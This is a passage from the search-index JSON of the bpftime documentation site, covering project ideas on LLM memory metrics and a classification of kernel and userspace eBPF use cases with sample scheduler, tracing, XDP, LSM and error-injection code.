(yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_5","title":"Objectives","text":"<ul> <li>Implement application specific metrics collection and profiling in BPFTime.</li> <li>Write eBPF for the far memory or distributed shared memory management.</li> </ul>"},{"location":"others/ideas/#expected-outcomes_7","title":"Expected Outcomes","text":"<ul> <li>A set of metrics that can provide the right information for the memory scheduling and the memory access pattern.</li> <li>A set of eBPF programs that can provide the right metrics for the large language model Training or Inference.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_6","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Understanding of kernel memory subsystem and memory management.</li> <li>Familiarity with user-space and kernel-space programming paradigms.</li> <li>Experience with developing and testing eBPF programs is highly advantageous.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_5","title":"Reference and Issue","text":"<ul> <li>eBPF for profiling: eBPF for profiling, eBPF for CPU scheduling: eBPF for CPU scheduling</li> <li>Paper's about ML for memory management in kernel: Predicting Dynamic Properties of Heap Allocations and Towards a Machine Learning-Assisted Kernel with LAKE</li> <li>State of the art far memory allocation Pond, Memtis, MIRA and TMTS</li> </ul>"},{"location":"others/ideas/#large-language-model-specific-metrics-observability-in-bpftime","title":"Large Language Model specific metrics observability in BPFTime","text":"<p>BPFTime is able to provide multiple source of metrics in the userspace from the classical uprobe with maps. We can also provide metrics from gathering from the GPU, memory watch point, and other hardware. To support gdb rwatch BPFTime, we need to set a segfault to the certain memory accessed. For the GPU uprobe, we need static compilation and runtime API hooks to hook the certain GPU function calls. The uprobe attatched to the certain function calls provides the right online spot for annotate and make adjustment to the kernel's memory scheduling. The memory watch points can provide the memory access pattern and the memory access frequency. The GPU metrics can provide the GPU utilization and the memory access pattern. The combination of these metrics can provide the right information for the memory scheduling and the memory access pattern.</p>"},{"location":"others/ideas/#project-overview_5","title":"Project Overview","text":"<ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_6","title":"Objectives","text":"<ul> <li>Provide the right metrics for the large language model Training or Inference.</li> <li>Programme the eBPF program to collect the right metrics and do the right scheduling.</li> </ul>"},{"location":"others/ideas/#expected-outcomes_8","title":"Expected Outcomes","text":"<ul> <li>Implement the gdb rwatch and GPU metrics in BPFTime.</li> <li>A set of metrics that can provide the right information for the memory scheduling and the memory access pattern.</li> <li>A set of eBPF programs that can provide the right metrics for the large language model Training or Inference.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_7","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Understanding the architecture of the large language model, and the metrics that are important for the performance.</li> <li>Has strong knowledge of GPU metrics collection, and gdb, perf, and other tools for metrics collection.</li> <li>Experience with developing and testing eBPF programs is highly advantageous.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_6","title":"Reference and Issue","text":"<ul> <li>Conceptual attach types discussion and in bpftime: GitHub Discussion</li> <li>Papers about GPU metrics collection: GPU metrics collection and GPU static compilation and runtime API hooks</li> <li>GDB's rwatch: GDB rwatch implemented on X86 and Arm</li> </ul>"},{"location":"others/ideas/#porting-bpftime-to-windows-freebsd-or-other-platforms","title":"Porting bpftime to Windows, FreeBSD, or other platforms","text":"<p>It would be similar to the porting to macOS.</p> <p>Share on  Share on </p>"},{"location":"others/usecases/","title":"ebpf usecases analysis","text":""},{"location":"others/usecases/#classification-of-kernel-ebpf-use-cases","title":"Classification of Kernel eBPF Use Cases","text":"<ol> <li>Policy Tuning</li> <li>Event Monitoring and Observability</li> <li>High-Speed Data Processing</li> <li>Access Control and Security</li> <li>Testing and Error Injection</li> <li>Patch Fixing and Dynamic Updates</li> </ol>"},{"location":"others/usecases/#1-policy-tuning","title":"1. Policy Tuning","text":"<p>Definition: Dynamically adjusting kernel policies to optimize system performance or behavior.</p> <p>Use Cases:</p> <ul> <li>Dynamic CPU Scheduling:</li> <li>Example: Adjusting the scheduler\u2019s behavior based on real-time CPU load using eBPF programs to prioritize critical processes, ensuring responsive performance for key services under high load conditions.</li> <li>Controlling the CPU scheduler with BPF https://lwn.net/Articles/873244/</li> <li>A lot of usecases this year in LPC: Sched-Ext: The BPF extensible scheduler class MC<ul> <li>https://lpc.events/event/18/sessions/192/</li> </ul> </li> <li> <p>Ghost (SOSP 21) https://dl.acm.org/doi/10.1145/3477132.3483542</p> </li> <li> <p>Memory Management Optimization:</p> </li> <li>Example: Modifying the page reclamation strategy during memory pressure. eBPF can influence how the kernel reclaims memory pages, optimizing memory utilization for memory-intensive applications.</li> <li>LPC and a few papers https://lpc.events/event/18/contributions/1932/</li> <li> <p>https://arxiv.org/pdf/2409.11220</p> </li> <li> <p>Dynamic I/O policy:</p> </li> <li>Example: Tuning I/O scheduling policies based on current disk usage patterns. For instance, optimizing read/write operations for database workloads by dynamically adjusting the I/O scheduler using eBPF.</li> <li> <p>eBPF for FUSE: https://lwn.net/Articles/915717/</p> <ul> <li>https://lpc.events/event/16/contributions/1339/attachments/945/1861/LPC2022%20Fuse-bpf.pdf</li> </ul> </li> <li> <p>HID Driver</p> </li> <li>https://docs.kernel.org/hid/hid-bpf.html</li> <li>Used y steamdeck</li> </ul>"},{"location":"others/usecases/#fuse-example","title":"Fuse example","text":"<pre><code>+struct fuse_ops {\n+ uint32_t (*open_prefilter)(const struct bpf_fuse_meta_info *meta,\n+ struct fuse_open_in *in);\n+ uint32_t (*open_postfilter)(const struct bpf_fuse_meta_info *meta,\n+ const struct fuse_open_in *in,\n+ struct fuse_open_out *out);\n+\n+ uint32_t (*opendir_prefilter)(const struct bpf_fuse_meta_info *meta,\n+ struct fuse_open_in *in);\n+ uint32_t (*opendir_postfilter)(const struct bpf_fuse_meta_info *meta,\n+ const struct fuse_open_in *in,\n+ struct fuse_open_out *out);\n+\n+ uint32_t (*create_open_prefilter)(const struct bpf_fuse_meta_info *meta,\n+ struct fuse_create_in *in, struct fuse_buffer *name);\n+ uint32_t (*create_open_postfilter)(const struct bpf_fuse_meta_info *meta,\n+ const struct fuse_create_in *in, const struct fuse_buffer *name,\n+ struct fuse_entry_out *entry_out, struct fuse_open_out *out);\n</code></pre>"},{"location":"others/usecases/#scheduler","title":"Scheduler","text":"<p>scx_rustland implements the following callbacks in the eBPF component:</p> <p><pre><code>/*\n * Scheduling class declaration.\n */\nSEC(\".struct_ops.link\")\nstruct sched_ext_ops rustland = {\n        .select_cpu             = (void *)rustland_select_cpu,\n        .enqueue                = (void *)rustland_enqueue,\n        .dispatch               = (void *)rustland_dispatch,\n        .running                = (void *)rustland_running,\n        .stopping               = (void *)rustland_stopping,\n        .update_idle            = (void *)rustland_update_idle,\n        .set_cpumask            = (void *)rustland_set_cpumask,\n        .cpu_release            = (void *)rustland_cpu_release,\n        .init_task              = (void *)rustland_init_task,\n        .exit_task              = (void *)rustland_exit_task,\n        .init                   = (void *)rustland_init,\n        .exit                   = (void *)rustland_exit,\n        .flags                  = SCX_OPS_ENQ_LAST | SCX_OPS_KEEP_BUILTIN_IDLE,\n        .timeout_ms             = 5000,\n        .name                   = \"rustland\",\n};\n</code></pre> The workflow is the following:</p> <p>.select_cpu() implements the logic to assign a target CPU to a task that wants to run, typically you have to decide if you want to keep the task on the same CPU or if it needs to be migrated to a different one (for example if the current CPU is busy); if we can find an idle CPU at this stage there\u2019s no reason to call the scheduler, the task can be immediately dispatched here. <pre><code>s32 BPF_STRUCT_OPS(rustland_select_cpu, struct task_struct *p, s32 prev_cpu,\n                   u64 wake_flags)\n{\n        bool is_idle = false;\n        s32 cpu;\n\n        cpu = scx_bpf_select_cpu_dfl(p, prev_cpu, wake_flags, &amp;is_idle);\n        if (is_idle) {\n                /*\n                 * Using SCX_DSQ_LOCAL ensures that the task will be executed\n                 * directly on the CPU returned by this function.\n                 */\n                dispatch_task(p, SCX_DSQ_LOCAL, 0, 0);\n                __sync_fetch_and_add(&amp;nr_kernel_dispatches, 1);\n        }\n\n        return cpu;\n}\n</code></pre> If we can\u2019t find an idle CPU this step will just return the previously used CPU, that can be used as a hint for the user-space scheduler (keeping tasks on the same CPU has multiple benefits, such as reusing hot caches and avoid any kind migration overhead). However this decision is not the final one, the user-space scheduler can decide to move the task to a different CPU if needed.</p> <ul> <li>https://arighi.blogspot.com/2024/02/writing-scheduler-for-linux-in-rust.html</li> </ul> <p>Or:</p> <pre><code>/* SPDX-License-Identifier: GPL-2.0 */\n/*\n * Copyright (c) 2024 Meta Platforms, Inc. and affiliates.\n * Copyright (c) 2024 David Vernet &lt;dvernet@meta.com&gt;\n */\n\n#include &lt;scx/common.bpf.h&gt;\n\nchar _license[] SEC(\"license\") = \"GPL\";\n\n#include \"hotplug_test.h\"\n\nUEI_DEFINE(uei);\n\nvoid BPF_STRUCT_OPS(hotplug_exit, struct scx_exit_info *ei)\n{\n    UEI_RECORD(uei, ei);\n}\n\nstatic void exit_from_hotplug(s32 cpu, bool onlining)\n{\n    /*\n     * Ignored, just used to verify that we can invoke blocking kfuncs\n     * from the hotplug path.\n     */\n    scx_bpf_create_dsq(0, -1);\n\n    s64 code = SCX_ECODE_ACT_RESTART | HOTPLUG_EXIT_RSN;\n\n    if (onlining)\n        code |= HOTPLUG_ONLINING;\n\n    scx_bpf_exit(code, \"hotplug event detected (%d going %s)\", cpu,\n             onlining ? \"online\" : \"offline\");\n}\n\nvoid BPF_STRUCT_OPS_SLEEPABLE(hotplug_cpu_online, s32 cpu)\n{\n    exit_from_hotplug(cpu, true);\n}\n\nvoid BPF_STRUCT_OPS_SLEEPABLE(hotplug_cpu_offline, s32 cpu)\n{\n    exit_from_hotplug(cpu, false);\n}\n\nSEC(\".struct_ops.link\")\nstruct sched_ext_ops hotplug_cb_ops = {\n    .cpu_online     = hotplug_cpu_online,\n    .cpu_offline        = hotplug_cpu_offline,\n    .exit           = hotplug_exit,\n    .name           = \"hotplug_cbs\",\n    .timeout_ms     = 1000U,\n};\n\nSEC(\".struct_ops.link\")\nstruct sched_ext_ops hotplug_nocb_ops = {\n    .exit           = hotplug_exit,\n    .name           = \"hotplug_nocbs\",\n    .timeout_ms     = 1000U,\n};\n</code></pre>"},{"location":"others/usecases/#a-common-appraoch-is-struct_ops","title":"A common appraoch is struct_ops","text":"<ul> <li>https://lwn.net/Articles/809092/</li> <li>https://lpc.events/event/17/contributions/1607/attachments/1164/2407/lpc-struct_ops.pdf</li> <li>https://docs.ebpf.io/linux/program-type/BPF_PROG_TYPE_STRUCT_OPS/</li> <li>https://github.com/torvalds/linux/blob/075dbe9f6e3c21596c5245826a4ee1f1c1676eb8/drivers/hid/bpf/hid_bpf_struct_ops.c#L279</li> </ul> <p>In kernel:</p> <pre><code>static struct bpf_struct_ops bpf_hid_bpf_ops = {\n    .verifier_ops = &amp;hid_bpf_verifier_ops,\n    .init = hid_bpf_ops_init,\n    .check_member = hid_bpf_ops_check_member,\n    .init_member = hid_bpf_ops_init_member,\n    .reg = hid_bpf_reg,\n    .unreg = hid_bpf_unreg,\n    .name = \"hid_bpf_ops\",\n    .cfi_stubs = &amp;__bpf_hid_bpf_ops,\n    .owner = THIS_MODULE,\n};\n\nvoid __hid_bpf_ops_destroy_device(struct hid_device *hdev)\n{\n    struct hid_bpf_ops *e;\n\n    rcu_read_lock();\n    list_for_each_entry_rcu(e, &amp;hdev-&gt;bpf.prog_list, list) {\n        hid_put_device(hdev);\n        e-&gt;hdev = NULL;\n    }\n    rcu_read_unlock();\n}\n\nstatic int __init hid_bpf_struct_ops_init(void)\n{\n    return register_bpf_struct_ops(&amp;bpf_hid_bpf_ops, hid_bpf_ops);\n}\nlate_initcall(hid_bpf_struct_ops_init);\n</code></pre>"},{"location":"others/usecases/#2-event-monitoring-and-observability","title":"2. Event Monitoring and Observability","text":"<p>Definition: Real-time collection and analysis of kernel and user-space events for monitoring, diagnostics, and performance analysis.</p> <p>Use Cases:</p> <ul> <li>System Tracing: probes</li> <li> <p>Example: Utilizing tools like bpftrace or BCC (BPF Compiler Collection) to attach eBPF programs to tracepoints or kprobes, enabling detailed monitoring of system calls, function executions, and performance bottlenecks.</p> </li> <li> <p>System Tracing: tracepoints</p> </li> <li> <p>Performance Profiling:</p> </li> <li>Example: Profiling CPU usage, memory allocations, and I/O operations to identify and resolve performance issues in applications and the kernel.</li> </ul> <p>probes:</p> <pre><code>SEC(\"uretprobe//bin/bash:readline\")\nint BPF_KRETPROBE(printret, const void *ret)\n{\n char str[MAX_LINE_SIZE];\n char comm[TASK_COMM_LEN];\n u32 pid;\n\n if (!ret)\n  return 0;\n\n bpf_get_current_comm(&amp;comm, sizeof(comm));\n\n pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n bpf_probe_read_user_str(str, sizeof(str), ret);\n\n bpf_printk(\"PID %d (%s) read: %s \", pid, comm, str);\n\n return 0;\n};\n</code></pre> <p>tracepoints/USDT</p> <pre><code>SEC(\"tracepoint/syscalls/sys_enter_openat\")\nint tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter* ctx)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    u32 pid = id &gt;&gt; 32;\n\n    if (pid_target &amp;&amp; pid_target != pid)\n        return false;\n\n    // Use bpf_printk to print the process information\n    bpf_printk(\"Process ID: %d enter sys openat\\n\", pid);\n    return 0;\n}\n</code></pre> <p>Foe example, the USDT are define as:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys sdt.h&gt;\n\nint main(int argc, char *argv[])\n{\n  int nargs = argc;\n\n  getc(stdin);\n\n  nargs = argc;\n\n  DTRACE_PROBE1(example, args, nargs);\n\n        return 0;\n}\n</code></pre> <p>The tracepoints are define as</p> <pre><code>#include &lt;trace/events/subsys.h&gt;\n\n#define CREATE_TRACE_POINTS\nDEFINE_TRACE(subsys_eventname);\n\nvoid somefct(void)\n{\n        ...\n        trace_subsys_eventname(arg, task);\n        ...\n}\n</code></pre>"},{"location":"others/usecases/#3-high-speed-data-processing","title":"3. High-Speed Data Processing","text":"<p>Definition: Implementing high-performance data processing within the kernel to bypass traditional software paths and enhance data handling efficiency.</p> <p>Use Cases:</p> <ul> <li>XDP (eXpress Data Path):</li> <li> <p>Example: Processing network packets at the earliest point in the network stack using eBPF programs to perform actions like filtering, redirection, or load balancing with minimal latency. For instance, implementing high-performance DDoS protection by quickly discarding malicious traffic to protect backend services.</p> </li> <li> <p>TCP Connection Optimization:</p> </li> <li> <p>Example: Enhancing the processing logic of TCP connections with eBPF to reduce latency and increase throughput. This includes customizing congestion control algorithms to better suit specific network environments, thereby improving network transmission efficiency.</p> </li> <li> <p>Custom Protocol Handling:</p> </li> <li>Example: Implementing custom network protocols or enhancing existing ones directly within the kernel using eBPF, allowing for specialized processing tailored to application needs.</li> </ul> <p>xdp:</p> <pre><code>SEC(\"xdp\")\nint xdp_pass(struct xdp_md* ctx) {\n    void* data = (void*)(long)ctx-&gt;data;\n    void* data_end = (void*)(long)ctx-&gt;data_end;\n    int pkt_sz = data_end - data;\n\n    bpf_printk(\"packet size is %d\", pkt_sz);\n    return XDP_PASS;\n}\n</code></pre> <p>sockops:</p> <pre><code>SEC(\"sk_msg\")\nint bpf_redir(struct sk_msg_md *msg)\n{\n    if(msg-&gt;remote_ip4 != LOCALHOST_IPV4 || msg-&gt;local_ip4!= LOCALHOST_IPV4) \n        return SK_PASS;\n\n    struct sock_key key = {\n        .sip = msg-&gt;remote_ip4,\n        .dip = msg-&gt;local_ip4,\n        .dport = bpf_htonl(msg-&gt;local_port), /* convert to network byte order */\n        .sport = msg-&gt;remote_port,\n        .family = msg-&gt;family,\n    };\n    return bpf_msg_redirect_hash(msg, &amp;sock_ops_map, &amp;key, BPF_F_INGRESS);\n}\n</code></pre> <p>No possible to use probe. &lt;10 ns make a difference, <code>kprobe</code> is 100ns. No trampoline. less function call.</p>"},{"location":"others/usecases/#4-access-control-and-security","title":"4. Access Control and Security","text":"<p>Definition: Dynamically enforcing access control policies to enhance system security.</p> <p>Use Cases:</p> <ul> <li>Dynamic Firewall Rules:</li> <li> <p>Example: Using eBPF to dynamically update firewall rules based on real-time threat intelligence, adjusting packet filtering strategies accordingly. For example, automatically blocking related IP addresses or ports when detecting abnormal traffic.</p> </li> <li> <p>LSM (Linux Security Modules) Enhancements:</p> </li> <li> <p>Example: Integrating eBPF with LSM frameworks like SELinux or AppArmor to create fine-grained access control policies that can be dynamically adjusted based on system state or security events.</p> </li> <li> <p>Seccomp Filters:</p> </li> <li> <p>Example: Applying advanced seccomp (secure computing) filters using eBPF to restrict system calls for specific applications, enhancing sandboxing and reducing attack surfaces.</p> </li> <li> <p>Container Security:</p> </li> <li>Example: Implementing security policies for containerized environments, such as Kubernetes, where eBPF enforces network policies, limits resource usage, and isolates container processes.</li> </ul> <p>example:</p>"},{"location":"others/usecases/#lsm","title":"LSM","text":"<p>kernel code:</p> <pre><code>        error = security_file_mprotect(vma, reqprot, prot);\n        if (error)\n            break;\n</code></pre> <p>https://github.com/torvalds/linux/blob/075dbe9f6e3c21596c5245826a4ee1f1c1676eb8/mm/mprotect.c#L824</p> <p>More detail analysis: </p> <ul> <li>https://elinux.org/images/0/0a/ELC_Inside_LSM.pdf</li> <li>https://docs.kernel.org/bpf/prog_lsm.html</li> <li>https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm/</li> </ul> <p>eBPF code example:</p> <pre><code>SEC(\"lsm/file_mprotect\")\nint BPF_PROG(mprotect_audit, struct vm_area_struct *vma,\n             unsigned long reqprot, unsigned long prot, int ret)\n{\n        /* ret is the return value from the previous BPF program\n         * or 0 if it's the first hook.\n         */\n        if (ret != 0)\n                return ret;\n\n        int is_heap;\n\n        is_heap = (vma-&gt;vm_start &gt;= vma-&gt;vm_mm-&gt;start_brk &amp;&amp;\n                   vma-&gt;vm_end &lt;= vma-&gt;vm_mm-&gt;brk);\n\n        /* Return an -EPERM or write information to the perf events buffer\n         * for auditing\n         */\n        if (is_heap)\n                return -EPERM;\n}\n</code></pre> <ul> <li>Return one value to access control one operation.</li> <li>Statically define in the code path. </li> </ul>"},{"location":"others/usecases/#5-testing-and-error-injection","title":"5. Testing and Error Injection","text":"<p>Definition: Utilizing eBPF for system testing, debugging, and injecting errors to verify system robustness and fault tolerance.</p> <p>Use Cases:</p> <ul> <li>Performance Testing:</li> <li> <p>Example: Monitoring the execution time of specific kernel functions or user-space applications using eBPF-based tools like bpftrace to identify performance bottlenecks.</p> </li> <li> <p>Functionality Verification:</p> </li> <li> <p>Example: Dynamically inserting probes with eBPF to verify that certain system calls or kernel functions behave as expected, ensuring the correctness of new features or patches.</p> </li> <li> <p>Network Fault Simulation:</p> </li> <li> <p>Example: Using eBPF to simulate network issues such as packet loss, increased latency, or bandwidth limitations to test how applications handle adverse network conditions.</p> </li> <li> <p>Memory Error Injection:</p> </li> <li> <p>Example: Simulating memory allocation failures or inducing memory leaks with eBPF to validate the system\u2019s resilience and error-handling mechanisms.</p> </li> <li> <p>I/O Error Simulation:</p> </li> <li> <p>Example: Introducing artificial I/O errors to test the robustness of storage systems and applications in handling disk failures or read/write errors.</p> </li> <li> <p>System Call Failures:</p> </li> <li>Example: Using eBPF to force certain system calls to fail under specific conditions, allowing developers to test application responses to unexpected failures.</li> </ul>"},{"location":"others/usecases/#6-patch-fixing-and-dynamic-updates","title":"6. Patch Fixing and Dynamic Updates","text":"<p>Definition: Applying kernel patches or fixes at runtime to address vulnerabilities or optimize functionalities without restarting the system.</p> <p>Use Cases:</p> <ul> <li>Dynamic Vulnerability Patching:</li> <li> <p>Example: Using eBPF to override or modify the behavior of vulnerable kernel functions on-the-fly, preventing exploitation without waiting for official kernel updates.</p> </li> <li> <p>Feature Enhancements:</p> </li> <li> <p>Example: Adding new functionalities to existing kernel components, such as introducing new caching strategies for file systems or optimizing network protocol handling, without modifying the kernel source code.</p> </li> <li> <p>Bug Fixes:</p> </li> <li> <p>Example: Implementing temporary bug fixes in production environments by dynamically patching kernel behavior using eBPF, ensuring system stability while awaiting official patches.</p> </li> <li> <p>Runtime Configuration Changes:</p> </li> <li>Example: Adjusting kernel parameters or behaviors dynamically based on changing workload requirements, enhancing flexibility and responsiveness without downtime.</li> </ul> <p>bpf_override_return\uff1a</p> <pre><code>+SEC(\"kprobe/open_ctree\")\n+int bpf_prog1(struct pt_regs *ctx)\n+{\n+   unsigned long rc = -12;\n+\n+   bpf_override_return(ctx, rc);\n+   return 0;\n+}\n+\n</code></pre>"},{"location":"others/usecases/#summary","title":"Summary","text":"<p>By consolidating Testing and Error Injection into a single category and refining the classification, we achieve a more streamlined and comprehensive understanding of eBPF's diverse applications within the Linux kernel. Here's the final categorized list:</p> <ol> <li>Policy Tuning: Dynamically adjusting kernel policies to optimize system behavior and performance.</li> <li>Event Monitoring and Observability: Real-time collection and analysis of system events for monitoring, diagnostics, and performance analysis.</li> <li>High-Speed Data Processing: Implementing efficient data processing within the kernel, bypassing traditional software paths to enhance data handling efficiency.</li> <li>Access Control and Security: Dynamically enforcing access control policies to enhance system security.</li> <li>Testing and Error Injection: Utilizing eBPF for system testing, debugging, and injecting errors to verify system robustness and fault tolerance.</li> <li>Patch Fixing and Dynamic Updates: Applying kernel patches or fixes at runtime to address vulnerabilities or optimize functionalities without restarting the system.</li> </ol> <p>Each category encompasses a wide range of functionalities, from optimizing system performance and enhancing security to enabling advanced testing and dynamic system modifications\u2014all achieved without altering the kernel source code or requiring system reboots. This classification not only aligns with your requirements but also provides a clear framework for understanding and leveraging eBPF to achieve flexible and dynamic kernel enhancements.</p>"},{"location":"others/usecases/#userspace","title":"userspace","text":""},{"location":"others/usecases/#1-policy-tuning_1","title":"1. Policy Tuning","text":"<p>Definition: Dynamically adjusting application policies to optimize performance, resource usage, or behavior based on real-time conditions.</p> <p>Use Cases:</p> <ul> <li>Dynamic Resource Allocation:</li> <li>Example: A userspace application, such as a web server, can dynamically adjust its thread pool size or cache sizes based on current traffic loads. For instance, during peak traffic, the application can increase the number of worker threads to handle more requests, and scale back during low traffic periods to conserve resources.</li> <li> <p>Analysis: This allows applications to maintain optimal performance without manual intervention, adapting to varying workloads seamlessly.</p> </li> <li> <p>Adaptive Rate Limiting:</p> </li> <li>Example: Implementing dynamic rate limiting for APIs based on real-time usage patterns. If an endpoint experiences a sudden spike in requests, the application can automatically tighten rate limits to prevent overloading while loosening them during normal traffic.</li> <li> <p>Analysis: Enhances the application's ability to handle fluctuating demand while protecting against abuse and ensuring fair resource distribution.</p> </li> <li> <p>Energy Efficiency Adjustments:</p> </li> <li>Example: On battery-powered devices, applications can adjust their operational parameters (e.g., reducing polling frequency or lowering graphical fidelity) based on battery levels to extend device usage time.</li> <li>Analysis: Improves user experience by balancing performance with energy consumption dynamically.</li> </ul>"},{"location":"others/usecases/#2-event-monitoring-and-observability_1","title":"2. Event Monitoring and Observability","text":"<p>Definition: Real-time collection, analysis, and visualization of application and system events for monitoring, diagnostics, and performance analysis.</p> <p>Use Cases:</p> <ul> <li>Real-Time Logging and Metrics Collection:</li> <li>Example: Applications can dynamically inject custom logging or metrics collection points based on runtime conditions. For example, a database application might increase logging verbosity during peak usage times to diagnose performance issues.</li> <li> <p>Analysis: Provides granular insights into application behavior and performance, facilitating proactive monitoring and quick issue resolution.</p> </li> <li> <p>Dynamic Tracing and Profiling:</p> </li> <li>Example: Using a userspace extension to attach tracing hooks to specific functions or modules within an application to monitor execution paths and performance bottlenecks without restarting the application.</li> <li> <p>Analysis: Enhances the ability to perform in-depth performance analysis and debugging in production environments with minimal overhead.</p> </li> <li> <p>Anomaly Detection:</p> </li> <li>Example: Implementing real-time anomaly detection within applications to identify unusual patterns or behaviors, such as unexpected spikes in resource usage or error rates, and trigger alerts or corrective actions.</li> <li>Analysis: Improves application reliability and uptime by enabling swift detection and response to abnormal conditions.</li> </ul>"},{"location":"others/usecases/#3-high-speed-data-processing_1","title":"3. High-Speed Data Processing","text":"<p>Definition: Implementing efficient data processing mechanisms within applications to handle large volumes of data with minimal latency.</p> <p>Use Cases:</p> <ul> <li>In-Memory Data Processing Enhancements:</li> <li>Example: Applications like real-time analytics platforms can dynamically optimize in-memory data structures or processing algorithms based on incoming data patterns to improve throughput and reduce latency.</li> <li> <p>Analysis: Enables applications to maintain high performance and responsiveness under varying data loads by adapting processing strategies on-the-fly.</p> </li> <li> <p>Custom Data Filtering and Transformation:</p> </li> <li>Example: A streaming data application can apply dynamic filters or transformations to incoming data streams based on current processing needs or external inputs, such as prioritizing certain data types during specific times.</li> <li> <p>Analysis: Increases the flexibility and efficiency of data processing pipelines, allowing applications to respond to changing data requirements without redeployment.</p> </li> <li> <p>Optimized Network Data Handling:</p> </li> <li>Example: Network-intensive applications, such as video conferencing tools, can dynamically adjust data encoding or compression techniques based on network conditions to optimize bandwidth usage and maintain video quality.</li> <li>Analysis: Enhances user experience by ensuring efficient data transmission and adapting to fluctuating network environments in real-time.</li> </ul>"},{"location":"others/usecases/#4-access-control-and-security_1","title":"4. Access Control and Security","text":"<p>Definition: Dynamically enforcing access control policies and security measures to protect applications and data.</p> <p>Use Cases:</p> <ul> <li>Dynamic Permission Management:</li> <li>Example: Applications can adjust user permissions in real-time based on contextual factors such as user behavior, location, or device security status. For instance, granting elevated privileges only when certain security checks pass.</li> <li> <p>Analysis: Enhances security by ensuring that access rights are contextually appropriate, reducing the risk of unauthorized access.</p> </li> <li> <p>Runtime Threat Mitigation:</p> </li> <li>Example: Integrating a userspace security module that monitors application behavior and dynamically blocks suspicious activities, such as unusual file access patterns or unexpected network connections.</li> <li> <p>Analysis: Provides proactive defense mechanisms that can adapt to emerging threats without requiring application restarts or updates.</p> </li> <li> <p>Secure API Gateways:</p> </li> <li>Example: Implementing dynamic security policies in API gateways to filter and validate incoming requests based on real-time threat intelligence, such as blocking requests from malicious IPs or enforcing stricter validation rules under attack conditions.</li> <li>Analysis: Enhances the security posture of applications by enabling real-time adjustments to security policies in response to the threat landscape.</li> </ul>"},{"location":"others/usecases/#5-testing-and-error-injection_1","title":"5. Testing and Error Injection","text":"<p>Definition: Utilizing dynamic capabilities to perform system testing, debugging, and injecting errors to verify system robustness and fault tolerance.</p> <p>Use Cases:</p> <ul> <li>Fault Injection for Resilience Testing:</li> <li>Example: Introducing simulated failures, such as network outages, memory leaks, or disk I/O errors within applications to test how they handle and recover from unexpected conditions.</li> <li> <p>Analysis: Helps developers identify weaknesses and improve the resilience of applications by observing their behavior under controlled failure scenarios.</p> </li> <li> <p>Dynamic Behavior Simulation:</p> </li> <li>Example: Simulating different user behaviors or load conditions dynamically to test application performance and scalability without needing predefined test scripts.</li> <li> <p>Analysis: Provides a more realistic and flexible approach to testing by allowing applications to experience varied and unpredictable scenarios during testing phases.</p> </li> <li> <p>Performance Benchmarking:</p> </li> <li>Example: Attaching dynamic profiling tools to applications to measure performance metrics such as execution time, memory usage, and I/O operations under different runtime conditions.</li> <li> <p>Analysis: Facilitates comprehensive performance assessments, enabling targeted optimizations based on real-time data.</p> </li> <li> <p>Dynamic Debugging:</p> </li> <li>Example: Inserting debugging hooks into applications at runtime to monitor and log internal states or variable values without stopping the application, aiding in real-time troubleshooting.</li> <li>Analysis: Enhances the debugging process by allowing developers to gain insights into application behavior without disrupting its operation.</li> </ul>"},{"location":"others/usecases/#6-patch-fixing-and-dynamic-updates_1","title":"6. Patch Fixing and Dynamic Updates","text":"<p>Definition: Applying patches, updates, or fixes to applications at runtime to address vulnerabilities, optimize functionalities, or introduce new features without restarting the system.</p> <p>Use Cases:</p> <ul> <li>Hotfix Deployment:</li> <li>Example: Rolling out critical security patches or bug fixes to running applications without downtime, ensuring continuous operation while maintaining security and stability.</li> <li> <p>Analysis: Minimizes service disruptions and enhances the ability to respond swiftly to critical issues, maintaining high availability.</p> </li> <li> <p>Feature Flag Management:</p> </li> <li>Example: Enabling or disabling application features dynamically based on user feedback, A/B testing results, or deployment strategies without redeploying the application.</li> <li> <p>Analysis: Increases flexibility in feature management, allowing for controlled rollouts and quick iterations based on real-world usage and feedback.</p> </li> <li> <p>Runtime Code Injection:</p> </li> <li>Example: Injecting new code or modifying existing code paths within applications to introduce performance optimizations or new functionalities on-the-fly.</li> <li> <p>Analysis: Enhances the ability to evolve application capabilities dynamically, adapting to changing requirements without extensive downtime or redevelopment efforts.</p> </li> <li> <p>Dynamic Configuration Updates:</p> </li> <li>Example: Adjusting application configurations such as thresholds, timeouts, or resource limits in real-time based on operational metrics and conditions.</li> <li>Analysis: Improves application adaptability by allowing configurations to be fine-tuned in response to real-time operational data, enhancing performance and reliability.</li> </ul>"},{"location":"others/usecases/#summary_1","title":"Summary","text":"<p>By extending the dynamic capabilities analogous to kernel eBPF into userspace, applications can achieve greater flexibility, efficiency, and resilience. The six high-level categories\u2014Policy Tuning, Event Monitoring and Observability, High-Speed Data Processing, Access Control and Security, Testing and Error Injection, and Patch Fixing and Dynamic Updates\u2014encompass a wide range of functionalities that empower applications to adapt and optimize in real-time. Below is a consolidated list of these categories with their respective userspace use cases:</p> <ol> <li>Policy Tuning</li> <li>Dynamic CPU Scheduling</li> <li>Memory Management Optimization</li> <li>Dynamic I/O Scheduling</li> <li> <p>Network QoS Adjustments</p> </li> <li> <p>Event Monitoring and Observability</p> </li> <li>System Tracing</li> <li>Performance Profiling</li> <li>Network Traffic Analysis</li> <li> <p>Application Metrics Collection</p> </li> <li> <p>High-Speed Data Processing</p> </li> <li>XDP (eXpress Data Path)</li> <li>TCP Connection Optimization</li> <li> <p>Custom Protocol Handling</p> </li> <li> <p>Access Control and Security</p> </li> <li>Dynamic Firewall Rules</li> <li>LSM Enhancements</li> <li>Seccomp Filters</li> <li> <p>Container Security</p> </li> <li> 